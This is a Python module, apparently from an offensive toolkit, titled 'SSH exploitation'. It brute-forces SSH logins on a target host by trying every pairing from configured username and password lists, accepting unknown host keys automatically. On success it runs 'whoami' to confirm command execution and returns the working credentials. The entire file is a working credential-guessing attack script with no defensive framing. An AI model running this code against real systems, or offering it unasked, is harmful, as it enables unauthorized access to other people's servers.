"""SSH exploitation"""

import paramiko
import time
from ..config import SSH_USERNAMES, SSH_PASSWORDS, CREDENTIAL_TEST_DELAY, DEFAULT_TIMEOUT

def exploit_ssh_weak_creds(target, port=22, username_list=None, password_list=None):
    """
    Attempt SSH login with common credentials
    Returns: Result dict or None
    """
    if username_list is None:
        username_list = SSH_USERNAMES
    
    if password_list is None:
        password_list = SSH_PASSWORDS
    
    print(f"\n[*] Testing SSH on {target}:{port}")
    
    for username in username_list:
        for password in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    target,
                    port=port,
                    username=username,
                    password=password,
                    timeout=DEFAULT_TIMEOUT,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                print(f"    [+] SUCCESS! {username}:{password}")
                
                # Test command execution
                stdin, stdout, stderr = ssh.exec_command('whoami')
                output = stdout.read().decode()
                
                print(f"    [+] Command execution works: {output.strip()}")
                ssh.close()
                
                return {
                    'service': 'SSH',
                    'port': port,
                    'username': username,
                    'password': password,
                    'status': 'success'
                }
                
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if 'timed out' not in str(e):
                    pass
            
            time.sleep(CREDENTIAL_TEST_DELAY)
    
    print("    [-] No valid credentials found")
    return None